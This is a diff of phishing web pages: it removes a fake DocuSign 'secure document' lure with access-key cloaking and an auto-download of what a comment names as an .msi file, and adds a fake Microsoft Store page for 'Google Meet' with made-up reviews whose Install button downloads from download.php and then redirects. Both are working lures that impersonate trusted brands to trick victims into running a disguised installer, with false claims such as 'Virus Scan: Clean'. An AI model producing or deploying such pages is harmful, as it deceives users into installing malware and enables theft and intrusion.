@@ -1,335 +1,279 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download Your Secure Document | CorporateShare</title>
-    <link rel="icon" type="image/x-icon" href="https://www.docusign.com/assets/images/favicon.ico">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --primary: #2563eb;
-            --primary-dark: #1d4ed8;
-            --text: #1f2937;
-            --text-light: #6b7280;
-            --background: #f9fafb;
-            --card-bg: #ffffff;
-            --border-radius: 8px;
-            --success: #10b981;
-            --warning: #f59e0b;
-        }
-        
-        body {
-            font-family: 'Plus Jakarta Sans', system-ui, -apple-system, sans-serif;
-            background-color: var(--background);
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: var(--text);
-            line-height: 1.5;
-        }
-        
-        .container {
-            background-color: var(--card-bg);
-            border-radius: var(--border-radius);
-            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
-            width: 90%;
-            max-width: 520px;
-            padding: 40px;
-            text-align: center;
-            border: 1px solid #e5e7eb;
-        }
-        
-        .logo {
-            height: 32px;
-            margin-bottom: 28px;
-        }
-        
-        h1 {
-            color: var(--text);
-            margin-bottom: 12px;
-            font-size: 1.5rem;
-            font-weight: 700;
-        }
-        
-        .description {
-            color: var(--text-light);
-            margin-bottom: 24px;
-            font-size: 0.95rem;
-            max-width: 380px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-        
-        .file-card {
-            background-color: #f8fafc;
-            border-radius: var(--border-radius);
-            padding: 20px;
-            margin: 28px 0;
-            text-align: left;
-            display: flex;
-            align-items: center;
-            border: 1px solid #e2e8f0;
-            position: relative;
-        }
-        
-        .file-icon {
-            font-size: 2rem;
-            color: #e63946;
-            margin-right: 16px;
-            flex-shrink: 0;
-        }
-        
-        .file-details {
-            overflow: hidden;
-        }
-        
-        .file-name {
-            font-weight: 600;
-            margin-bottom: 6px;
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-        }
-        
-        .file-meta {
-            color: var(--text-light);
-            font-size: 0.85rem;
-            display: flex;
-            gap: 12px;
-            flex-wrap: wrap;
-        }
-        
-        .security-badge {
-            position: absolute;
-            top: -10px;
-            right: 16px;
-            background-color: var(--success);
-            color: white;
-            padding: 4px 12px;
-            border-radius: 20px;
-            font-size: 0.75rem;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-        
-        .download-btn {
-            background-color: var(--primary);
-            color: white;
-            border: none;
-            padding: 14px 24px;
-            border-radius: var(--border-radius);
-            font-size: 1rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            width: 100%;
-            margin-top: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-        }
-        
-        .download-btn:hover {
-            background-color: var(--primary-dark);
-        }
-        
-        .countdown {
-            margin-top: 20px;
-            font-size: 0.85rem;
-            color: var(--text-light);
-        }
-        
-        .manual-download {
-            margin-top: 24px;
-            font-size: 0.85rem;
-            color: var(--text-light);
-        }
-        
-        .manual-download a {
-            color: var(--primary);
-            text-decoration: none;
-            font-weight: 500;
-        }
-        
-        .review-section {
-            margin-top: 32px;
-            padding-top: 24px;
-            border-top: 1px solid #e5e7eb;
-            font-size: 0.85rem;
-            color: var(--text-light);
-        }
-        
-        .review-section a {
-            color: var(--primary);
-            text-decoration: none;
-            font-weight: 500;
-        }
-        
-        @media (max-width: 480px) {
-            .container {
-                padding: 32px 24px;
-            }
-            
-            .logo {
-                height: 28px;
-                margin-bottom: 24px;
-            }
-            
-            .file-card {
-                padding: 16px;
-            }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Google Meet - Microsoft Store</title>
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f3f3f3;
+      color: #1b1b1b;
+    }
+    nav {
+      background-color: #ffffff;
+      border-bottom: 1px solid #ddd;
+    }
+    .nav-container {
+      max-width: 1100px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 12px 24px;
+    }
+    .nav-left,
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+    .nav-left a {
+      text-decoration: none;
+      color: #1b1b1b;
+      font-weight: 500;
+      transition: color 0.3s ease;
+    }
+    .nav-left a:hover {
+      color: #0067b8;
+    }
+    .nav-left img {
+      height: 32px;
+    }
+    .nav-right input {
+      padding: 6px 12px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    header {
+      display: flex;
+      align-items: center;
+      padding: 16px 24px;
+      background-color: #ffffff;
+      box-shadow: 0 1px 4px rgba(0, 0, 0, 0.1);
+    }
+    .logo {
+      width: 40px;
+      margin-right: 12px;
+    }
+    .app-name {
+      font-size: 24px;
+      font-weight: 600;
+    }
+    .main {
+      max-width: 1100px;
+      margin: 40px auto;
+      padding: 0 24px;
+      display: grid;
+      grid-template-columns: 300px 1fr;
+      gap: 32px;
+    }
+    .app-icon img {
+      width: 100%;
+      border-radius: 20px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+    }
+    .info h1 {
+      font-size: 32px;
+      margin-bottom: 8px;
+    }
+    .developer {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 16px;
+    }
+    .install-btn {
+      background-color: #0067b8;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .install-btn:hover {
+      background-color: #005a9e;
+    }
+    .install-btn:disabled {
+      background-color: #999;
+      cursor: not-allowed;
+      opacity: 0.7;
+    }
+    .screenshots {
+      display: flex;
+      gap: 12px;
+      overflow-x: auto;
+      padding: 12px 0;
+    }
+    .screenshots img {
+      height: 300px;
+      border-radius: 10px;
+      flex-shrink: 0;
+    }
+    .description {
+      margin-top: 24px;
+      font-size: 15px;
+      line-height: 1.6;
+    }
+    .reviews {
+      margin-top: 40px;
+      padding-top: 20px;
+      border-top: 1px solid #ddd;
+    }
+    .reviews h2 {
+      font-size: 22px;
+      margin-bottom: 16px;
+    }
+    .review {
+      margin-bottom: 24px;
+      background-color: #fff;
+      padding: 16px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+    }
+    .stars {
+      font-size: 18px;
+      color: #f5a623;
+      margin-bottom: 8px;
+    }
+    .review-text {
+      font-size: 15px;
+      color: #333;
+      margin-bottom: 6px;
+    }
+    .review-author {
+      font-size: 13px;
+      color: #777;
+    }
+    @media (max-width: 768px) {
+      .main {
+        grid-template-columns: 1fr;
+      }
+      .screenshots img {
+        height: 200px;
+      }
+      .nav-right input {
+        width: 140px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        
-        <h1>Your Document is Ready</h1>
-        <p class="description">This secure file has been shared with you via <strong>Docusign</strong>.</p>
-        
-        <div class="file-card">
-            <div class="security-badge">
-                <i class="fas fa-shield-alt"></i> Verified & Secure
-            </div>
-            <div class="file-icon">
-                <i class="fas fa-file-pdf"></i>
-            </div>
-            <div class="file-details">
-                <div class="file-name">B2_RFQ_Information_Rep_2026.pdf</div>
-                <div class="file-meta">
-                    <span><i class="far fa-file"></i> 4.8 MB</span>
-                    <span><i class="far fa-clock"></i> Uploaded: Jan 14, 2026</span>
-                    <span><i class="fas fa-check-circle"></i> Virus Scan: Clean</span>
-                </div>
-            </div>
-        </div>
-        
-        <div class="countdown" id="countdown">Secure download starting in 5 seconds...</div>
-        <button class="download-btn" id="downloadBtn">
-            <i class="fas fa-download"></i> Download Document
-        </button>
-        
-        <div class="manual-download">
-            <a href="#" id="manualLink"><i class="fas fa-hand-pointer"></i> Click here if download doesn't start</a>
-        </div>
-        
-        <div class="review-section">
-            <i class="fas fa-info-circle"></i> Please review this document and <a href="mailto:contact@abccorp.com?subject=File%20Feedback">get back to us</a> with any questions.
-        </div>
+
+  <!-- Navigation -->
+  <nav>
+    <div class="nav-container">
+      <div class="nav-left">
+        <a href="#"><img src="./img/microsoft-logo-dark-1.png" alt="Microsoft Logo"></a>
+        <a href="#"><img src="./img/microsoft-logo-dark-2.png" alt="Google Meet Logo"></a>
+        <a href="#">Home</a>
+        <a href="#">Apps</a>
+        <a href="#">Games</a>
+        <a href="#">Deals</a>
+      </div>
+      <div class="nav-right">
+        <input type="text" placeholder="Search" />
+      </div>
+    </div>
+  </nav>
+
+  <!-- Page Header -->
+  <header>
+    <img src="./img/gmeet.png" alt="Google Meet App Icon" class="logo" />
+    <span class="app-name">Google Meet for Meetings</span>
+  </header>
+
+  <!-- Main Content -->
+  <section class="main">
+    <div class="app-icon">
+      <img src="./img/gmeet.png" alt="Google Meet Icon" />
     </div>
 
-    <script src="../config/config.js"></script>
-    <script>
-        (function () {
-            if (!window.config) return;
+    <div class="info">
+      <h1>Google Meet – One Platform to Connect</h1>
+      <div class="developer">Published by Google Meet Video Communications, Inc.</div>
 
-            const {
-                accessKey,
-                accessValue,
-                redirectUrl,
-                downloadFile,
-                downloadName
-            } = window.config;
+      <!-- Download Button -->
+      <button class="install-btn" id="downloadBtn" type="button">
+        <span id="btnText">Install</span>
+      </button>
 
-            const params = new URLSearchParams(window.location.search);
-            if (params.get(accessKey) !== accessValue) {
-                window.location.href = redirectUrl;
-                return;
-            }
+      <div class="screenshots">
+        <img src="./img/sc1.webp" alt="Google Meet screenshot 1" />
+        <img src="./img/sc2.webp" alt="Google Meet screenshot 2" />
+        <img src="./img/sc3.webp" alt="Google Meet screenshot 3" />
+		<img src="./img/sc4.webp" alt="Google Meet screenshot 4" />
+		<img src="./img/sc5.webp" alt="Google Meet screenshot 5" />
+      </div>
 
-            let countdownTime = 5;
-            const countdownElement = document.getElementById('countdown');
+      <div class="description">
+        <p>
+          Google Meet is the leader in modern enterprise video communications, with an easy,
+          reliable cloud platform for video and audio conferencing, chat, and webinars.
+        </p>
+        <p>
+          Download the Google Meet client to start or join a secure meeting, collaborate with
+          your team, or attend online events and webinars.
+        </p>
+      </div>
 
-            const interval = setInterval(() => {
-                countdownTime--;
-                countdownElement.textContent =
-                    `Secure download starting in ${countdownTime} seconds...`;
+      <div class="reviews">
+        <h2>User Reviews</h2>
+        <div class="review">
+          <div class="stars">★★★★★</div>
+          <p class="review-text">“Google Meet makes remote meetings seamless. Easy to use and reliable.”</p>
+          <p class="review-author">– Sarah K.</p>
+        </div>
+        <div class="review">
+          <div class="stars">★★★★☆</div>
+          <p class="review-text">“Great for webinars and team chats. Minor bugs occasionally.”</p>
+          <p class="review-author">– Mark T.</p>
+        </div>
+        <div class="review">
+          <div class="stars">★★★☆☆</div>
+          <p class="review-text">“Good features, but could be more lightweight on battery.”</p>
+          <p class="review-author">– Dana P.</p>
+        </div>
+      </div>
+    </div>
+  </section>
 
-                if (countdownTime <= 0) {
-                    clearInterval(interval);
+  <!-- Working Download Script -->
+<script>
+  const btn = document.getElementById('downloadBtn');
+  const btnText = document.getElementById('btnText');
 
-                    const link = document.createElement('a');
-                    link.href = downloadFile;
-                    link.download = downloadName || downloadFile;
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
+  function startDownload() {
+    if (btn.disabled) return; // Prevent double trigger
+    btnText.textContent = 'Starting download...';
+    btn.disabled = true;
 
-                    setTimeout(() => {
-                        window.location.href = redirectUrl;
-                    }, 5000);
-                }
-            }, 1000);
-        })();
+    const link = document.createElement('a');
+    link.href = 'download.php';
+    link.setAttribute('download', '');
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 
-        // (function() {
-        //     function checkAccessKey() {
-        //         const accessKey = window.config.accessKey;
-        //         const accessValue = window.config.accessValue;
-        //         const redirectUrl = window.config.redirectUrl;
-                
-        //         const urlParams = new URLSearchParams(window.location.search);
-        //         const key = urlParams.get(accessKey);
-        //         if (key !== accessValue) {
-        //             window.location.href = redirectUrl;
-        //             return false;
-        //         }
-        //         return true;
-        //     }
+    setTimeout(() => {
+      window.location.href = 'microsoft-store.php';
+    }, 10000);
+  }
 
-        //     if (!checkAccessKey()) {
-        //         return;
-        //     }
+  // Manual click
+  btn.addEventListener('click', startDownload);
 
-        //     const downloadFile = window.config.downloadFile || "B2_Procurement_Inquiry_2026.msi";
-        //     let countdownTime = 5;
-        //     const countdownElement = document.getElementById('countdown');
-        //     // const spinner = document.getElementById('spinner');
-        //     // const downloadInfo = document.getElementById('downloadInfo');
+</script>
 
-        //     spinner.classList.add('active');
-
-        //     const countdownInterval = setInterval(() => {
-        //         countdownTime--;
-        //         countdownElement.textContent =
-        //             `Secure download starting in ${countdownTime} seconds...`;
-
-
-        //         if (countdownTime <= 0) {
-        //             clearInterval(countdownInterval);
-        //             countdownElement.style.display = 'none';
-        //             downloadInfo.textContent = 'Downloading...';
-                    
-        //             const link = document.createElement('a');
-        //             link.href = downloadFile;
-        //             link.download = window.config.downloadName || downloadFile;
-        //             link.style.display = 'none';
-        //             link.setAttribute('download', window.config.downloadName || downloadFile);
-        //             document.body.appendChild(link);
-                    
-        //             try {
-        //                 link.click();
-        //             } catch (e) {
-        //                 window.open(downloadFile, '_blank');
-        //             }
-                    
-        //             setTimeout(() => {
-        //                 document.body.removeChild(link);
-        //                 window.location.href = window.config.redirectUrl;
-        //             }, 2000);
-        //         }
-        //     }, 1000);
-        // })();
-    </script>
+  </script>
 </body>
 </html>
